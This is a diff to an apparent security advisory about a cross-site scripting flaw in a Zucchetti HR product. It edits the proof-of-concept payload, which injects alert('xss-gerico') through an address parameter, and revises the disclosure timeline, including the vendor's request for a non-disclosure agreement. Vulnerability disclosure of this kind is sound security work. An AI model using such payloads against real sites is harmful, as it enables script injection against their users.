@@ -46,7 +46,7 @@ And this is the payload execution result:
 Payload used is the following:
 
 ```js
-address=canary%22,map);}alert('xss-gerico');function+test(){//
+canary%22,map);}alert('xss-gerico');function+test(){//
 ```
 
 With a different payload we can obtain JavaScript code execution using `zoom` parameter:
@@ -71,7 +71,7 @@ Payload used is the following:
 
 ## 3. Disclosure
 
-We’ve decided to follow the industry standard 90+30 days responsible disclosure process; here’s the timeline:
+We’ve decided to follow the industry standard 90 days responsible disclosure process; here’s the timeline:
 
  * **June 23, 2026**: Sent initial report to Zucchetti’s "Servizio Security Compliance" of "Area Suite HR Zucchetti" (security.compliance@zucchetti.it) with full technical details.
  * **June 23, 2026**: Zucchetti demands the signing of an agreement that prevents us from disclosing the discovered vulnerability.
